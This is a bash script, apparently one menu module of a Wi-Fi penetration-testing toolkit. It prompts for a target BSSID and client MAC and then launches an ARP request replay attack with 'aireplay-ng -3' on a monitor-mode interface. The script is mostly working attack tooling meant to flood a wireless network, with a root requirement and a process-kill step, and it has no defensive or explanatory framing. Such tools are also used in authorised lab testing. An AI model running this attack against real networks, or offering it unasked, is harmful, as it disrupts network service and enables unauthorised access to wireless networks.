#!/bin/bash

source Attacks/common.sh

# Color & style constants
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# Require root privileges
require_root # NU AI NEVOIE STERGE DACA VREI SA MEARGA

# Main menu prompt
prompt_to_continue() {
    local options=("Start ARP attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}          ARP Request Replay Attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} ARP replay attacks flood the network—expect heavy traffic."
    echo -e "${RED}[!]${NC} Some APs may detect and block replayed requests."

    echo
    echo -e "${GREEN}[*]${NC} Available options:"
    echo
    for i in "${!options[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} ${options[$i]}"
        sleep 0.1
    done
    echo -e "  ${GREEN}[0]${NC} Go back"
    echo

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Choose an option:") " opt
        case "$opt" in
            1) break ;;  # proceed
            0) go_back ;;  # back
            *) echo -e "${RED}[!]${NC} Invalid. Choose 0 or 1."; sleep 0.3 ;;
        esac
    done
}

arp_attack() {
    clear 

    echo -e "${GREEN}[*]${NC} Enter details for the arp request replay attack:"

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Target BSSID (MAC format): ")" bssid
        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid MAC address."
            sleep 0.3
        fi
    done
    echo -e "${GREEN}[✓]${NC} BSSID set: $bssid"

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Client MAC :") " client
        [[ "$client" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && break
        echo -e "${RED}[!]${NC} Invalid MAC."; sleep 0.3
    done
    echo -e "${GREEN}[✓]${NC} Client set: $client"


    read -p "$(echo -e "${GREEN}[*]${NC} Press Enter to start the arp requests replay attack...")"

    gnome-terminal -- bash -c "sudo aireplay-ng -3 -b \"$bssid\" -h \"$client\" \"$MONITOR_INTERFACE\"; exec bash" &
    
    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Type 'stop' to stop the process: ")" user_input
        if [[ "$user_input" == "stop" ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid input. Please type 'stop' to stop the command."
        fi
    done
    
    sudo pkill -f aireplay-ng

    echo -e "${GREEN}[✓]${NC} Attack complete."; sleep 0.5
    
    sleep 1.3
}

# Repeat or go back (stop capture then menu)
after_attack_options() {
    echo
    echo -e "  ${GREEN}[1]${NC} New ARP request replay attack"
    echo -e "  ${GREEN}[0]${NC} Go back to main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Choose an option:") " o
        case "$o" in
            1) clear; arp_attack; after_attack_options; break ;;  
            0) ask_stop_capture; go_back ;;
            *) echo -e "${RED}[!]${NC} Type 0 or 1."; sleep 0.3
        esac
    done
}

# Entry point
main() {
    clear
    prompt_to_continue
    check_monitor_interfaces
    ask_capture_choice 
    arp_attack
    after_attack_options
}

main
